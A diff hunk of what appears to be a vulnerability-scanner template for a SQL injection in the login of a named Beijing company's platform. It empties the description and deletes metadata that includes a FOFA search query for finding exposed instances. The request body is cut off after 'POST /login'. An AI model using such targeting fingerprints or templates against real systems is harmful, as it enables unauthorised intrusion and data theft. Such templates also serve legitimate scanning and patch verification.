@@ -3,12 +3,8 @@ info:
   name: 北京中犇科技有限公司数字化智能中台系统login存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ea621de9nwth6e73'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ea621de9nwth6e73
-    fofa: body="/member/get_verify_code/get_code" || icon_hash="1056416905"
 http:
 - raw:
   - 'POST /login HTTP/1.1
